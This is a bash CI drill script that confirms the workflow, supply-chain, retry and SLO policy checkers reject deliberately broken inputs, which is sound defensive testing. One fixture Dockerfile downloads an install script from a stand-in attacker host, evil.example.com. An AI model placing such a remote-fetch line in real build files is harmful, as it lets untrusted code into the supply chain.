#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT_DIR"

tmpdir="$(mktemp -d)"
cleanup() { rm -rf "$tmpdir"; }
trap cleanup EXIT INT TERM

echo "🔎 [ci-disaster-drill] start"

cat >"$tmpdir/bad_workflow.yml" <<'EOF'
name: bad
jobs:
  bad:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          clean: true
EOF
mkdir -p "$tmpdir/.github/workflows"
mv "$tmpdir/bad_workflow.yml" "$tmpdir/.github/workflows/ci.yml"
if python3 scripts/check_workflow_runner_governance.py --root "$tmpdir" >/dev/null 2>&1; then
  echo "❌ [ci-disaster-drill] workflow governance unexpectedly passed broken workflow" >&2
  exit 1
fi

cat >"$tmpdir/bad_dockerfile" <<'EOF'
FROM example.invalid/test:latest
RUN curl -fsSL https://evil.example.com/install.sh -o /tmp/install.sh
EOF
orig_dockerfile="$ROOT_DIR/infra/ci/Dockerfile.core"
backup_dockerfile="$tmpdir/Dockerfile.core.bak"
cp "$orig_dockerfile" "$backup_dockerfile"
cp "$tmpdir/bad_dockerfile" "$orig_dockerfile"
if python3 scripts/check_ci_supply_chain_policy.py >/dev/null 2>&1; then
  echo "❌ [ci-disaster-drill] supply-chain policy unexpectedly passed broken Dockerfile" >&2
  cp "$backup_dockerfile" "$orig_dockerfile"
  exit 1
fi
cp "$backup_dockerfile" "$orig_dockerfile"

mkdir -p .runtime-cache/openvibecoding/reports/ci/cost_profile
cat > "$tmpdir/cost_profile.json" <<'EOF'
{"retry_green_count": 1}
EOF
if python3 scripts/check_ci_retry_green_policy.py --cost-profile "$tmpdir/cost_profile.json" >/dev/null 2>&1; then
  echo "❌ [ci-disaster-drill] retry-green policy unexpectedly passed retry_green_count=1" >&2
  exit 1
fi

mkdir -p "$tmpdir/ci_slices/quick-feedback"
cat > "$tmpdir/ci_slices/quick-feedback/summary.json" <<'EOF'
{"slice":"quick-feedback","status":"success","duration_sec":9999}
EOF
if python3 scripts/build_ci_slo_dashboard.py --mode strict --slices-root "$tmpdir/ci_slices" --out-dir "$tmpdir/slo" >/dev/null 2>&1; then
  echo "❌ [ci-disaster-drill] slo dashboard unexpectedly passed an obvious breach" >&2
  exit 1
fi

echo "✅ [ci-disaster-drill] PASS"
